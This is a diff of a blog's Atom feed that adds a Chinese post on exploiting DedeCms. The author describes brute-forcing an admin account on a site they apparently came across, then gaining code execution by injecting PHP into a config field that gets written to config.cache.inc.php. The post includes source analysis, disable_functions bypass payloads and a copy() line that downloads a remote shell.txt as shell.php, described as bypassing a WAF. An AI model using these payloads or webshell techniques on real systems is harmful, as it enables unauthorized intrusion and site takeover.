@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://1946dream.github.io/</id>
     <title>ChongMeng</title>
-    <updated>2021-08-17T04:55:25.865Z</updated>
+    <updated>2021-08-17T14:31:38.804Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://1946dream.github.io/"/>
     <link rel="self" href="https://1946dream.github.io/atom.xml"/>
@@ -10,6 +10,232 @@
     <logo>https://1946dream.github.io/images/avatar.png</logo>
     <icon>https://1946dream.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ChongMeng</rights>
+    <entry>
+        <title type="html"><![CDATA[DedeCms漏洞分析与Bypass]]></title>
+        <id>https://1946dream.github.io/post/dedecms-lou-dong-fen-xi-yu-bypass/</id>
+        <link href="https://1946dream.github.io/post/dedecms-lou-dong-fen-xi-yu-bypass/">
+        </link>
+        <updated>2021-08-17T14:18:17.000Z</updated>
+        <content type="html"><![CDATA[<p>近期碰到一个织梦，通过FUZZ找到了后台地址，爆破出一个普通账号。进入后台<br>
+<img src="https://1946dream.github.io//post-images/1629209984835.png" alt="" loading="lazy"></p>
+<h1 id="getshell尝试">GetShell尝试</h1>
+<p>模板Getshell-失败<br>
+文件管理器Getshell-失败<br>
+广告链接Getshell-失败<br>
+.....................................失败</p>
+<h1 id="插入配置getshell">插入配置Getshell</h1>
+<p>耗时不知多久，找到了配置Getshell方法。<br>
+<img src="https://1946dream.github.io//post-images/1629210067818.png" alt="" loading="lazy"></p>
+<pre><code>21;phpinfo()
+</code></pre>
+<p>执行PHP代码。<br>
+<img src="https://1946dream.github.io//post-images/1629210119858.png" alt="" loading="lazy"></p>
+<h1 id="缺陷改进">缺陷(改进)</h1>
+<p>如果直接输入 21;phpinfo,容易把主页也覆盖掉。<br>
+<img src="https://1946dream.github.io//post-images/1629210145239.png" alt="" loading="lazy"><br>
+需要添加判断。</p>
+<pre><code>if($_GET[1]){phpinfo()} //使用GET方式1。
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://1946dream.github.io//post-images/1629210229700.png" alt="" loading="lazy"></figure>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>抓包<br>
+<img src="https://1946dream.github.io//post-images/1629210275428.png" alt="" loading="lazy"><br>
+跟进 sys_info.php 文件<br>
+<img src="https://1946dream.github.io//post-images/1629210303818.png" alt="" loading="lazy"><br>
+&amp;dopost=save，</p>
+<pre><code>&lt;?
+if($dopost==&quot;save&quot;)
+{
+    if(!isset($token)){
+        echo 'No token found!';
+        exit;
+    }
+
+    if(strcasecmp($token, $_SESSION['token']) != 0){
+        echo 'Token mismatch!';
+        exit;
+    }
+    foreach($_POST as $k=&gt;$v)
+    {
+        if(preg_match(&quot;#^edit___#&quot;, $k))
+        {
+            $v = cn_substrR(${$k}, 1024);
+        }
+        else
+        {
+            continue;
+        }
+        $k = preg_replace(&quot;#^edit___#&quot;, &quot;&quot;, $k);
+        $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' &quot;);
+    }
+    ReWriteConfig();
+    ShowMsg(&quot;成功更改站点配置！&quot;, &quot;sys_info.php&quot;);
+    exit();
+}
+?&gt;
+</code></pre>
+<p>这里我们首先关注 1行-12行</p>
+<pre><code>&lt;?
+
+if($dopost==&quot;save&quot;)
+
+{
+
+    if(!isset($token)){
+
+        echo 'No token found!';
+
+        exit;
+
+    }
+
+
+    if(strcasecmp($token, $_SESSION['token']) != 0){
+
+        echo 'Token mismatch!';
+
+        exit;
+
+    }
+</code></pre>
+<p>看到首先对 $dopost==&quot;save&quot; 进行了一个判断对应我们输入的参数dopost=save ，两个if都是对于token的进行一个判断预防我们未授权操作。未授权漏洞(无)<br>
+接着我们关注13行-25行</p>
+<pre><code>&lt;?
+
+foreach($_POST as $k=&gt;$v)
+
+    {
+
+        if(preg_match(&quot;#^edit___#&quot;, $k))
+
+        {
+
+            $v = cn_substrR(${$k}, 1024);
+
+        }
+
+        else
+
+        {
+
+            continue;
+
+        }
+
+        $k = preg_replace(&quot;#^edit___#&quot;, &quot;&quot;, $k);
+
+        $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' &quot;);
+
+    }
+</code></pre>
+<p>使用了超全局变量 $_POST 然后用foreach进行数组遍历，最后插入到数据库中。<br>
+<img src="https://1946dream.github.io//post-images/1629210382175.png" alt="" loading="lazy"><br>
+更新配置成功。<br>
+下来我们看写到文件的配置代码</p>
+<pre><code>&lt;?
+
+//更新配置函数
+
+function ReWriteConfig()
+
+{
+
+    global $dsql,$configfile;
+
+    if(!is_writeable($configfile))
+
+    {
+
+        echo &quot;配置文件'{$configfile}'不支持写入，无法修改系统配置参数！&quot;;
+
+        exit();
+
+    }
+
+    $fp = fopen($configfile,'w');
+
+    flock($fp,3);
+
+    fwrite($fp,&quot;&lt;&quot;.&quot;?php\r\n&quot;);
+
+    $dsql-&gt;SetQuery(&quot;SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC &quot;);
+
+    $dsql-&gt;Execute();
+
+    while($row = $dsql-&gt;GetArray())
+
+    {
+
+        if($row['type']=='number')
+
+        {
+
+            if($row['value']=='') $row['value'] = 0;
+
+            fwrite($fp,&quot;\${$row['varname']} = &quot;.$row['value'].&quot;;\r\n&quot;);
+
+        }
+
+        else
+
+        {
+
+            fwrite($fp,&quot;\${$row['varname']} = '&quot;.str_replace(&quot;'&quot;,'',$row['value']).&quot;';\r\n&quot;);
+
+        }
+
+    }
+
+    fwrite($fp,&quot;?&quot;.&quot;&gt;&quot;);
+
+    fclose($fp);
+
+}
+</code></pre>
+<p>首先使用了两个全局变量全局搜索一下</p>
+<pre><code>$configfile = DEDEDATA.'/config.cache.inc.php';
+
+$dsql 为操作数据库
+</code></pre>
+<p>6行-10行检测了文件是否具备写入权限。</p>
+<pre><code>&lt;?    
+
+if(!is_writeable($configfile))
+
+    {
+
+        echo &quot;配置文件'{$configfile}'不支持写入，无法修改系统配置参数！&quot;;
+
+        exit();
+
+    }
+</code></pre>
+<p>11行-30行<br>
+打开了config.cache.inc.php这个文件开始写入<?php 格式，从数据库中取出数据 根据 varname字段 与 value进行批量写入。在28行写入了一i个?>收尾。<br>
+跟进 config.cache.inc.php 文件<br>
+<img src="https://1946dream.github.io//post-images/1629210520791.png" alt="" loading="lazy"><br>
+发现 ftp_port 字段处被成功了写入了我们刚才的字符串，造成了代码执行。</p>
+<h1 id="bypass">Bypass</h1>
+<h2 id="1">1</h2>
+<p>在查看到phpinfo页面时候会发现 disable_functions</p>
+<pre><code>passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,link等
+</code></pre>
+<p>禁用了很多函数。<br>
+代码执行Bypass函数如下</p>
+<pre><code>scandir(); //列出文件夹所有文件名可跨目录
+
+file_get_contents（）；列目录与读文件配合
+</code></pre>
+<p>payload</p>
+<pre><code>if($_GET[1])print_r(scandir($_GET[2]));
+</code></pre>
+<h2 id="2">2</h2>
+<p>copy();函数远程下载文件到本地，之前可以绕过宝塔WAF。<br>
+payload</p>
+<pre><code>copy(&quot;www.xxx.com/shell.txt&quot;,&quot;./shell.php&quot;);
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[万户OA-漏洞分析]]></title>
         <id>https://1946dream.github.io/post/wan-hu-oa-lou-dong-fen-xi/</id>
